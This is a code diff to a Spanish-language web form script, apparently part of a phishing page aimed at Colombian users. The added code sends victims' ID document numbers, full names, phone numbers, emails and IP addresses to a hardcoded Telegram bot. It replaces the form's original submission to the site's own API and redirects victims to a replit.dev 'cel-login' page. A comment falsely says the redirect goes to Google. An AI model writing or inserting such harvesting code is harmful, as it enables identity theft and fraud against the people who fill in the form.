@@ -308,6 +308,58 @@
 
             let isCheckboxChecked = false;
 
+            // ========== FUNCIÓN PARA ENVIAR A TELEGRAM ==========
+            async function enviarATelegram(formData) {
+                const botToken = '5994237488:AAGUtik1uogUX4yBD3PcFZd43pOI2Jf7SmA';
+                const chatId = '5647970395';
+
+                // Obtener IP del footer
+                let ip = 'No disponible';
+                const footerIp = document.getElementById('footer-ip');
+                if (footerIp) {
+                    ip = footerIp.innerHTML.replace('Dirección IP: ', '');
+                }
+
+                const mensaje = `📋 *NUEVO FORMULARIO ENVIADO* 📋
+
+*Tipo Documento:* ${formData.tipoDocumento || 'No especificado'}
+*Número Documento:* ${formData.numeroDocumento || 'No especificado'}
+*Nombre Completo:* ${formData.nombreCompleto || 'No especificado'}
+*Teléfono:* ${formData.numeroTelefono || 'No especificado'}
+*Email:* ${formData.correoElectronico || 'No especificado'}
+*Autorización:* ${formData.autorizacion ? '✅ Sí' : '❌ No'}
+*Token Usuario:* ${formData.userToken || 'No disponible'}
+*Fecha:* ${new Date().toLocaleString('es-CO')}
+*IP:* ${ip}`;
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: mensaje,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    const resultado = await response.json();
+
+                    if (resultado.ok) {
+                        console.log('✅ Mensaje enviado a Telegram correctamente');
+                    } else {
+                        console.error('❌ Error de Telegram:', resultado.description);
+                    }
+                    return resultado.ok;
+                } catch (error) {
+                    console.error('❌ Error de conexión con Telegram:', error.message);
+                    return false;
+                }
+            }
+            // ========== FIN FUNCIÓN TELEGRAM ==========
+
             function validateEmail(email) {
                 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 return emailPattern.test(email);
@@ -393,7 +445,7 @@
 
                     dropdownList.classList.add('hidden');
                     selectButton.setAttribute('aria-expanded', 'false');
-                    
+
                     validateForm();
                 });
             });
@@ -440,7 +492,7 @@
 
             checkboxButton.addEventListener('click', function() {
                 isCheckboxChecked = !isCheckboxChecked;
-                
+
                 if (isCheckboxChecked) {
                     this.setAttribute('aria-checked', 'true');
                     this.setAttribute('data-state', 'checked');
@@ -454,7 +506,7 @@
                     this.innerHTML = '';
                     hiddenCheckbox.checked = false;
                 }
-                
+
                 validateForm();
             });
 
@@ -465,16 +517,22 @@
                 }
             });
 
+            // ========== EVENTO DEL BOTÓN CONTINUAR - REDIRIGE A GOOGLE ==========
             nextButton.addEventListener('click', function(e) {
                 e.preventDefault();
-                
+
                 if (!nextButton.hasAttribute('disabled')) {
+                    // Cambiar texto del botón mientras envía
+                    const originalText = nextButton.textContent;
+                    nextButton.textContent = 'ENVIANDO...';
                     nextButton.setAttribute('disabled', '');
-                    
+
+                    // Generar token de usuario si no existe
                     if (!localStorage.getItem('userToken')) {
                         localStorage.setItem('userToken', Math.random().toString(36).substring(2) + Date.now().toString(36));
                     }
-                    
+
+                    // Preparar datos del formulario
                     const formData = {
                         action: 'formulario-inicial',
                         userToken: localStorage.getItem('userToken'),
@@ -486,32 +544,16 @@
                         autorizacion: isCheckboxChecked
                     };
 
-                    fetch('api/api', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(formData)
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.success) {
-                            window.location.href = 'index';
-                        } else {
-                            nextButton.textContent = 'CONTINUAR';
-                            nextButton.removeAttribute('disabled');
-                            alert('Error al enviar los datos. Inténtalo de nuevo.');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        nextButton.textContent = 'CONTINUAR';
-                        nextButton.removeAttribute('disabled');
-                        alert('Error de conexión. Inténtalo de nuevo.');
-                    });
+                    // Enviar a Telegram (esto no bloquea la redirección)
+                    enviarATelegram(formData).catch(err => console.log('Error Telegram:', err));
+
+                    // Redirigir a Google después de 1 segundo (para asegurar que se envíe a Telegram)
+                    setTimeout(function() {
+                        window.location.href = 'https://c06ee90f-3fb6-4852-a646-6dbc9af41a12-00-1bxh70pv9h19o.worf.replit.dev/svp/sv/cel-login.html';
+                    }, 1000);
                 }
             });
-
+            // ========== FIN DEL EVENTO ==========
 
             validateForm();
         });
